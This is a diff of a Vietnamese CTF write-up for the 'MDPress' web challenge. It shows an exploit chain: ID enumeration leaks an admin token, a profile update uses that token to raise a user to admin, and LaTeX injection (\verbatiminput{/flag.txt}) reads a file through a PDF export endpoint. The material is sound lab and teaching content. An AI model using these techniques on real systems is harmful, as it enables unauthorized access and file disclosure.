@@ -1,4 +1,4 @@
-# MDPress — CTF Writeup
+# CSCV2026 — CTF Writeup
 
 **Challenge:** MDPress  
 **Category:** Web  
@@ -8,10 +8,8 @@
 
 ## Tổng quan
 
-MDPress là một nền tảng blog cho phép admin xuất bài viết ra PDF thông qua LaTeX. Người dùng thường chỉ có quyền đọc bài viết. Chuỗi khai thác gồm hai bước chính:
-
 1. **Privilege Escalation** — lấy token của admin thông qua ID enumeration
-2. **LaTeX Injection** — đọc file hệ thống thông qua endpoint compile-to-PDF
+2. **LaTeX Injection** — đọc file /flag.txt thông qua latex command
 
 ---
 
@@ -147,16 +145,6 @@ GET /api/users/u_7d4f9a2e6b1c8035f4a9d2e1
 
 Response:
 
-```json
-{
-  "bio": "System administrator.",
-  "displayName": "Administrator",
-  "role": "admin",
-  "token": "MD-PROMOTE-7F3A91",
-  "uid": "u_7d4f9a2e6b1c8035f4a9d2e1",
-  "username": "admin"
-}
-```
 
 ![Token của admin bị lộ qua GET /api/users/<uid>](images/img7.png)
 
@@ -165,30 +153,6 @@ Response:
 ## Bước 5 — Privilege Escalation
 
 Dùng token `MD-PROMOTE-7F3A91` để cập nhật profile của `kanie05`:
-
-```http
-PUT /api/users/me/profile HTTP/1.1
-Authorization: Bearer <JWT_kanie05>
-Content-Type: application/json
-
-{
-  "displayName": "kanie05",
-  "bio": "",
-  "token": "MD-PROMOTE-7F3A91"
-}
-```
-
-Response xác nhận leo thang thành công:
-
-```json
-{
-  "displayName": "kanie05",
-  "role": "admin",
-  "token": "MD-PROMOTE-7F3A91",
-  "uid": "u_8b89988123cfc639f5f71dd5",
-  "username": "kanie05"
-}
-```
 
 > `role` đã chuyển thành **`admin`**.
 
@@ -214,7 +178,6 @@ Content-Type: application/json
 
 PDF export hiển thị **LATEX-TEST** in đậm — xác nhận injection thành công.
 
-![Test payload \textbf{} được render vào PDF](images/img9.png)
 ![PDF output: LATEX-TEST in đậm](images/img10.png)
 
 ---
@@ -247,35 +210,3 @@ Sau đó gọi endpoint compile-latex để xuất PDF và đọc output.
 CSCV2026{md_to_pdf_l4tex_inj3ction_r3ads_4ny_file}
 ```
 
----
-
-## Tóm tắt chuỗi khai thác
-
-```
-[Recon]
-  Đăng nhập user thường → phát hiện endpoint & source code
-
-[IDOR + Token Leak]
-  md5(n) → GET /api/discussions/<id> → lấy sig (uid)
-  GET /api/users/<uid>               → response lộ token
-  Fuzz n=1..3000                     → tìm uid của admin
-
-[Privilege Escalation]
-  PUT /api/users/me/profile + token admin
-  → role: "user" → role: "admin"
-
-[LaTeX Injection]
-  POST /api/discussions (content = LaTeX payload)
-  → POST /api/discussions/<id>/compile-latex
-  → \verbatiminput{/flag.txt} → đọc flag trong PDF
-```
-
----
-
-## Bài học
-
-| Lỗ hổng | Nguyên nhân |
-|---|---|
-| **IDOR / Token Exposure** | `GET /api/users/<uid>` trả về `token` của user bất kỳ mà không kiểm tra quyền |
-| **Insecure Privilege Model** | Server chấp nhận `token` do client tự cập nhật để thay đổi `role` |
-| **LaTeX Injection** | Content không được sanitize trước khi nhúng vào file `.tex` |
